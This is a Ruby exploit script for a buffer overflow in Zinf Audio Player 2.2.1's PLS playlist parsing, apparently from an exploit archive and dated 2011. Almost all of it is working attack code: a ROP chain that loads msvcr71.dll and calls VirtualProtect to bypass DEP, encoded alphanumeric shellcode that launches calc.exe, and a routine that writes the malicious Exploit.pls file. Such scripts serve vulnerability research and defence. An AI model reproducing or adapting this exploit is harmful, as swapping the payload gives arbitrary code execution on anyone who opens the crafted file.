#!/usr/bin/ruby
#
#[+]Exploit Title: Zinf Audio Player v2.2.1 PLS File Buffer Overflow Vulnerability(DEP BYPASS)
#[+]Date: 03\08\2011
#[+]Author: C4SS!0 and h1ch4m
#[+]Found by: Delikon(http://www.exploit-db.com/exploits/559/) or also Metasploit(http://www.exploit-db.com/exploits/16688)
#[+]Software Link: http://sourceforge.net/projects/zinf/files/zinf/2.2.1/zinf-setup-2.2.1.exe/download
#[+]Version: 2.2.1
#[+]Tested on: Windows XP SP3 Brazilian Portuguese(DEP in AlwaysOn)
#[+]CVE: N/A
#
#
#Exploit Based in Corelan Team Tuturial https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/
#LoadLibraryA("msvcr71.dll") + VirtualProtect()
#

sys = `ver`
if sys =~/Windows/
system("cls")
system("color 4f")
else
system("clear")
end
print '''

		Zinf Audio Player v2.2.1 PLS File Buffer Overflow Vulnerability(DEP BYPASS)
		Created by C4SS!0 and h1ch4m
		E-mails:
			C4SS!0 : louredo_@hotmail.com 
	        	h1ch4m : h1ch4m@hotmail.com 
		Sites: 
			C4SS!0 : net-fuzzer.blogspot.com
			h1ch4m : net-effects.blogspot.com
		
'''
sleep(3)
#Endereco para VirtualProtect 0x7C3528DD
#########################################ROP FOR LOAD "msvcr71.dll"#################################
rop = [0x10002a6f].pack('V') # PUSH ESP # POP EDI # POP ESI # POP EBP # MOV EAX,1 # POP EBX # ADD ESP,30 # RETN
rop += "A" * 12
rop += [0x0040556A].pack('V') # ADD ESP,54 # RETN // Funcao de retorno da LoadLibraryA , Depois de executar LoadLibraryA vem para AQUI.!!!
rop += "A" * (80-rop.length)
rop += [0x100014e8].pack('V') # MOV EAX,EDI # POP EDI # POP ESI # RETN
rop += "G"  * 8 # JUNK
rop += [0x1205017d].pack('V') # POP EBX # RETN    
rop += "\x00\x00\x00\x00"
rop += [0x1203678a].pack('V') # ADD EBX,EAX # NOP # NOP # NOP # NOP # RETN  
rop += [0x112054dd].pack('V') # XCHG EAX,EBP # RETN   REPLACE
rop += [0x00420044].pack('V') # POP EBP # RETN
rop += [0x0040556A].pack('V') # ADD ESP,54 # RETN // Funcao de retorno da LoadLibraryA , Depois de executar LoadLibraryA vem para AQUI.!!!
rop += [0x10001E11].pack('V') # POP EDI # RETN
rop += [0x7C801D7B].pack('V') # Endereco para LoadLibraryA  // Conserta o valor de EDI para o PUSHAD
rop += [0x1200CA76].pack('V') # PUSHAD # RETN
rop += "msvcr71.dll\x00"
rop += "D" * 56
##########################################ROP END HERE####################################

##########################################ROP FOR VirtualProtect###########################
rop += [0x1200edf1].pack('V') # POP EDI # RETN
rop += "JJJJ" # JUNK
rop += [0x7C3528DD].pack('V') # Ponteiro para VirtualProtect
rop += [0x00409E6A].pack('V') # MOV EAX,EBX # POP EBX #  RETN 0c
rop += "PPPP"
rop += [0x0042044B].pack('V') * 3 # RETN
rop += [0x0040dc54].pack('V') # PUSH ESI # ADD AL,5E # POP EBP # RETN 04 
############################ADICIONANDO A EAX######################################
rop += [0x7C3410C3].pack('V') # POP ECX # RETN
rop += [0x00000200].pack('V') # O valor que sera adicionado a EAX
rop += [0x7C358F2C].pack('V') # ADD EAX,ECX # POP ESI # RETN
rop += "GGGG"
#####################################################################################
rop += [0x0040fd82].pack('V') # XCHG EAX,ECX # POP EBP # RETN
rop += "BBBB"
rop += [0x1201dc80].pack('V') # MOV EAX,ECX # RETN  
rop += [0x1060fd8f].pack('V') # XCHG EAX,EBP # RETN 
################################MUDA O ENDERE�O DO PARAMETRO#######################################
rop += [0x1201dc80].pack('V') # MOV EAX,ECX # RETN  
rop += [0x12007AD6].pack('V') # POP EBX # RETN
rop += "\x00\x00\x00\x00"
rop += [0x7c3451b9].pack('V') # POP EDX # RETN
rop += "\x00\x00\x00\x00" 
rop += [0x1203678a].pack('V') # ADD EBX,EAX # NOP # NOP # NOP # NOP # RETN  //Endere�o do ultimo paramentro de VirtualProtect
rop += [0x1000333e].pack('V') # ADD EDX,EBX # POP EBX # RETN 10
rop += "QQQQ"
rop += [0x12007AD7].pack('V') * 10 # RETN
###################################################################################################
rop += [0x0040ba55].pack('V') # XCHG EAX,EDX # RETN  // Endereco disponivel
rop += [0x12011D0B].pack('V') # XCHG EAX,ECX # CMP EAX,5E5F0002 # RETN
rop += [0x12007AD7].pack('V') # RETN
rop += [0x10001436].pack('V') # MOV EAX,ECX # POP EBX # RETN
rop += "GGGG"
rop += [0x12007AD6].pack('V') # POP EBX # RETN
rop += "\x00\x03\x00\x00"
rop += [0x11601da9].pack('V') # POP EAX # RETN 
rop += "\x40\x00\x00\x00"
rop += [0x0040ba55].pack('V') # XCHG EAX,EDX # RETN
rop += [0x12026C85].pack('V') # PUSHAD # RETN
rop += "A" * 156
#########################Ir para o shellcode depois da fun�ao VirtualProtect###############
rop += [0x10002e13].pack('V')  # ADD EAX,ECX # RETN
rop += [0x10610e4d].pack('V')  # POP ECX # RETN
rop += [0x0000012b].pack('V')  # Valor que sera adicionado a EAX
rop += [0x10002e13].pack('V')  # ADD EAX,ECX # RETN
rop += [0x111025F1].pack('V')  # CALL EAX and JMP to my Shellcode. :)
##########################################ROP END HERE#####################################
shellcode = "\x44" * (50-0x12)
shellcode += 
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIONMRU2SJXH9KHNHYD4FDK"+
"D0XGC9YX1FRP1T0B2TCRPEBK3RJMNZ8GMLV879DONSVQXK7FWLCSIJ5VLO0WXWYWVLDO0O2SZGL62OVO"+
"RP3N3DMMERZJDY3R9N0Q695JE6J3KEUYGM5LNQTR0EK3PUDYY0PN3MY3NQ4KX980PGSPPN3N5L3Q5RI9"+ #Shellcode Alpha Numeric WinExec "Calc.exe"
"GQ3J5M6MO9KMMOQ7OHZT2X2SLLUKOS1L6VDN6QKJWUGTV07YVMHMKQY4N5NG4WLE4QML9QWOOELVEXMQ"+ #Baseaddress EAX.
"2LFNN2UMWFWE2KSPLWK8OSWDJ1O8NOTGPQK1K0KJGZJ5OE8VCNW9T4Q2RUMOZ6NCTL9TSLKJNZKW0NMN"+
"LSQMFWOHKHLLX7ON4SNZQ4NQO4QMVLNMZPVD89ULWKNTQMP0M1S3L6SNXMWBYNPPIT73NOXWKRRVZRN8"+
"WDN0SUK8WOMV4DNNTWPYWN27KA"
buf = "A" * 1300
buf += rop
buf += shellcode

print "\t\t[+]Creating Exploit File...\n"
sleep(1)
begin
File.open("Exploit.pls","wb") do |f| 
f.write buf
f.close
print "\t\t[+]File Exploit.pls create successfully.\n"
sleep(1)
end
rescue
print "**[-]Error: #{$!}\n"
exit(0)
end